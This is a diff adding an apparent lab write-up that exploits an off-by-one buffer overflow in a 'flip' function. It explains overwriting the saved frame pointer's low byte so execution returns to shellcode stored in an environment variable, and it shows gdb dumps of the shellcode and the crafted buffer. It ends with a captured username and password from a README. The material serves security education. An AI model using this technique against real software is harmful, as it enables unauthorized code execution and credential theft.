@@ -1,0 +1,54 @@
+In this problem, we aim to exploit the off-by-one vulnerability found in the for loop of the flip function (line 9). Since the loop condition allows for 65 elements to be inserted into the 64-byte buffer, we can overwrite the least significant byte of the SFP/EBP, thus allowing us to forge the RIP to point to the start of our shell code, which will be executed upon the function’s return call.
+
+In our exploit, the egg script contains our shell code: since the output of egg is passed in as an environment variable, this allows us to have a definitive address for the shell code (in the environment portion of memory - 0xbfffff9a).
+
+(gdb) x/s *((char **)environ)
+ ...
+(gdb) x/10x 0xbfffff9a
+0xbfffff9a:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
+0xbfffffaa:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
+
+Now that we know the location of our shell code, we can begin by setting a breakpoint at line 19 and observing our EBP (for the invoke function) to be 0xbffffbb8. We then set another breakpoint at line 9 (before the buffer is filled) and determined our buffer.
+
+(gdb) p $ebp
+$3 = (void *) 0xbffffb68
+(gdb) p &buf
+$5 = (char **) 0xbffffb70
+
+Firstly, since we can only overwrite the least significant byte of the SFP, we chose to set these last two bits of our buffer to 0x58, which will set the SFP at the address 0xbffffbb8 (the EBP of invoke) to point to the start of the buffer (0xbffffb78).
+
+Note: We selected 0x58 because of the bit-shifting that occurs in line 10.
+Note: Though the buffer starts at 0xbffffb70 currently, it shifts to 0xbffffb78 after flip executes.
+
+Next, we needed to place the address of the shell code into the buffer. Since the RIP is always found 4 bytes after the EBP, we set the address of the shell code to be 4 bytes after the start of the buffer.
+
+Then, we filled the rest of the buffer with 56 bits of random info to account for 65 bytes total.
+
+Thus, if we continue until we hit the end of the for loop (line 11), we see our buffer filled as described:
+
+(gdb) x/24x &buf
+0xbffffb70:	0xbffffb78	0xbffffd97	0xd0d0d0d0	0xbfffff9a
+0xbffffb80:	0xdededede	0xdddddddd	0xdbdbdbdb	0xdadadada
+0xbffffb90:	0xd9d9d9d9	0xd8d8d8d8	0xd7d7d7d7	0xd6d6d6d6
+0xbffffba0:	0xd5d5d5d5	0xd4d4d4d4	0xd3d3d3d3	0xd2d2d2d2
+0xbffffbb0:	0xd1d1d1d1	0xd0d0d0d0	0xbffffb78
+
+Once we exit flip(), we see:
+
+(gdb) x/10x $ebp
+0xbffffbb8:	0xbffffb78
+
+Finally, when we exit dispatch(), we get back to the start of the buffer (with our correct values)
+
+(gdb) x/10x $ebp
+0xbffffb78:	0xd0d0d0d0	0xbfffff9a	0xdededede	0xdddddddd
+
+
+Thus, when our code once again calls return, it will execute the shell code & we can get the password:
+
+$ cat README
+Perhaps we are asking the wrong questions.
+
+user: jz
+pass: a;Vn3/D@
+
